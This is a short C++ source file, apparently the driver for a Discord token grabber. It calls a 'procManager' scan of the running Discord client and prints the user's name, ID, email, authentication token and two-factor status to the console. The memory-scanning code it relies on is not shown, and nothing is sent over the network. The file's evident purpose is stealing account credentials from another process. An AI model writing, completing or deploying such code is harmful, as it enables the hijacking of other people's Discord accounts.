#include "../proc/proc.h"

int main(void)
{
    procManager manager;


    discordInformation info = manager.scan();
    
    std::cout << "environment: " << info.environment << std::endl;
    std::cout << "release: " << info.release << std::endl;
    std::cout << "username: " << info.user.username << std::endl;
    std::cout << "userid: " << info.user.id << std::endl;
    std::cout << "email: " << info.user.email << std::endl;
    std::cout << "token: " << info.user.token << std::endl;
    std::cout << "2factor: " << info.user.twofactor << std::endl;
    
    Sleep(30000);

    return 0;
} 